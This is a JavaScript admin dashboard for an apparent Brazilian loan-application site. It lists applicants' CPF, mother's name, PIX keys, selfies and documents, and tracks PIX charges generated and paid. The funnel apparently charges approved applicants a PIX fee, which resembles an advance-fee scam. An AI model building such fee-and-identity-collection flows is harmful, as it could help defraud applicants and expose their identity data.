(function () {
  const labels = {
    novo: 'Novo',
    cadastro: 'Cadastro',
    analise: 'Em análise',
    pix: 'PIX gerado',
    aprovado: 'Aprovado',
    reprovado: 'Reprovado',
    pendente: 'Pendente'
  };

  async function api(url, opts) {
    const res = await fetch(url, Object.assign({ credentials: 'include', headers: { 'Content-Type': 'application/json' } }, opts || {}));
    if (res.status === 401) throw new Error('auth');
    const data = await res.json().catch(() => ({}));
    if (!res.ok) throw new Error(data.error || 'Erro');
    return data;
  }

  async function boot() {
    try {
      await api('/api/admin/me');
      showApp();
    } catch {
      document.getElementById('loginView').classList.remove('hidden');
      document.getElementById('appView').classList.add('hidden');
    }
  }

  async function doLogin(e) {
    e.preventDefault();
    const btn = document.getElementById('loginBtn');
    btn.disabled = true;
    btn.textContent = 'Entrando...';
    document.getElementById('loginErr').textContent = '';
    try {
      await api('/api/admin/login', {
        method: 'POST',
        body: JSON.stringify({
          user: document.getElementById('user').value,
          password: document.getElementById('password').value
        })
      });
      showApp();
    } catch (err) {
      document.getElementById('loginErr').textContent = err.message === 'auth' ? 'Usuário ou senha inválidos' : err.message;
    } finally {
      btn.disabled = false;
      btn.textContent = 'Entrar no painel';
    }
    return false;
  }

  async function logout() {
    await fetch('/api/admin/logout', { method: 'POST', credentials: 'include' });
    location.reload();
  }

  async function showApp() {
    document.getElementById('loginView').classList.add('hidden');
    document.getElementById('appView').classList.remove('hidden');
    try {
      await loadStats();
      await loadLeads();
    } catch (err) {
      document.getElementById('tableWrap').innerHTML = '<div class="empty">' + (err.message || 'Erro ao carregar') + '</div>';
    }
  }

  function pct(n) { return (Number(n) || 0).toLocaleString('pt-BR') + '%'; }

  async function loadStats() {
    const s = await api('/api/admin/stats');
    document.getElementById('kpis').innerHTML = [
      ['Solicitações', s.leads, 'leads recebidos'],
      ['Taxa de aprovação', pct(s.conversionRate), s.approvedCount + ' créditos pagos'],
      ['PIX gerados', s.pixGenerated, 'vs ' + s.pixPaid + ' pagos'],
      ['PIX pagos', pct(s.pixPayRate), 'conversão do PIX']
    ].map(([l, v, e]) => `<div class="kpi"><span>${l}</span><strong>${v}</strong><em>${e}</em></div>`).join('');

    const total = Math.max(1, s.leads);
    const rows = [
      ['Cadastros', s.leads],
      ['Com foto', s.withPhoto],
      ['PIX gerado', s.pixGenerated],
      ['PIX pago', s.pixPaid]
    ];
    document.getElementById('funnelBars').innerHTML = rows.map(([l, v]) => {
      const w = Math.round((Number(v) / total) * 100);
      return `<div class="bar-row"><span>${l}</span><div class="bar"><i style="width:${Math.min(100, w)}%"></i></div><b>${v}</b></div>`;
    }).join('');
    document.getElementById('statusBox').innerHTML = `
      <div class="kpi"><span>Pendentes</span><strong>${s.pendingCount || 0}</strong></div>
      <div class="kpi" style="margin-top:10px"><span>Gateway</span><strong>${esc(s.gateway || 'flevopay')}</strong></div>
    `;
  }

  async function loadLeads() {
    const q = document.getElementById('search').value;
    const rows = await api('/api/admin/leads?q=' + encodeURIComponent(q));
    if (!rows.length) {
      document.getElementById('tableWrap').innerHTML = '<div class="empty">Nenhuma solicitação ainda.</div>';
      return;
    }
    document.getElementById('tableWrap').innerHTML = `
      <table>
        <thead><tr><th>Quando</th><th>Cliente</th><th>CPF</th><th>Status</th><th>PIX</th><th>Fotos</th></tr></thead>
        <tbody>
          ${rows.map((r) => `
            <tr onclick="openLead('${r.id}')">
              <td>${fmt(r.createdAt)}</td>
              <td>${esc(r.nome || '—')}</td>
              <td>${esc(r.cpf || '—')}</td>
              <td><span class="tag ${esc(r.status || 'pendente')}">${esc(labels[r.status] || r.status || 'Pendente')}</span></td>
              <td>${r.pixCount || 0}</td>
              <td>${r.photoCount || 0}</td>
            </tr>
          `).join('')}
        </tbody>
      </table>`;
  }

  async function openLead(id) {
    const l = await api('/api/admin/leads/' + id);
    document.getElementById('listView').classList.add('hidden');
    const d = document.getElementById('detailView');
    d.classList.remove('hidden');
    const fields = [
      ['Nome', l.nome], ['CPF', l.cpf], ['Nome da mãe', l.nomeMae], ['Nascimento', l.dataNasc],
      ['E-mail', l.email], ['Telefone', l.telefone], ['Banco', l.banco], ['Tipo PIX', l.tipoPix],
      ['Chave PIX', l.chavePix], ['Valor aprovado', l.valor], ['Parcelas', l.parcelas], ['Parcela', l.parcelaMensal],
      ['Status', labels[l.status] || l.status], ['UTM source', l.utmSource], ['Campanha', l.utmCampaign], ['ttclid', l.ttclid]
    ];
    d.innerHTML = `
      <button class="btn ghost small" onclick="backList()">← Voltar</button>
      <h2 style="margin:16px 0 18px">${esc(l.nome || 'Cliente')} <span class="tag ${esc(l.status || '')}">${esc(labels[l.status] || l.status || '')}</span></h2>
      <div class="grid">
        ${fields.map(([k, v]) => `<div class="field"><small>${k}</small>${esc(v || '—')}</div>`).join('')}
      </div>
      <h3 style="margin:22px 0 8px">Selfie e documentos</h3>
      <div class="photos">
        ${(l.photos || []).length ? l.photos.map((p) => `<a href="${p.url}" target="_blank"><img src="${p.url}" alt="selfie"></a>`).join('') : '<div class="empty">Nenhuma foto enviada</div>'}
      </div>
      <h3 style="margin:22px 0 8px">PIX gerados</h3>
      ${(l.pix || []).length ? l.pix.map((p) => `
        <div class="pix">
          <div><strong>${esc(p.gateway || 'flevopay')} · ${esc(p.product || p.page || 'PIX')}</strong> · ${esc(statusLabel(p.status))} · ${fmt(p.createdAt)}</div>
          <div style="font-size:12px;color:#6B7280;margin-top:4px">ID: ${esc(p.transactionId || p.reference || '—')} · valor: ${esc(money(p.amount))}</div>
          ${p.qrCode ? `<code>${esc(p.qrCode)}</code><button class="btn small" onclick="navigator.clipboard.writeText(${JSON.stringify(p.qrCode)})">Copiar código</button>` : ''}
        </div>
      `).join('') : '<div class="empty">Nenhum PIX gerado ainda</div>'}
    `;
  }

  function backList() {
    document.getElementById('detailView').classList.add('hidden');
    document.getElementById('listView').classList.remove('hidden');
    loadLeads();
    loadStats();
  }
  function statusLabel(s) {
    if (s === 'approved' || s === 'paid') return 'Pago';
    if (s === 'failed' || s === 'expired') return 'Falhou / expirou';
    return 'Pendente';
  }
  function money(cents) {
    const n = Number(cents);
    if (!n && n !== 0) return '—';
    return (n / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  }
  function fmt(iso) {
    if (!iso) return '—';
    return new Date(iso).toLocaleString('pt-BR');
  }
  function esc(s) {
    return String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
  }

  window.doLogin = doLogin;
  window.logout = logout;
  window.loadLeads = loadLeads;
  window.openLead = openLead;
  window.backList = backList;
  boot();
})();
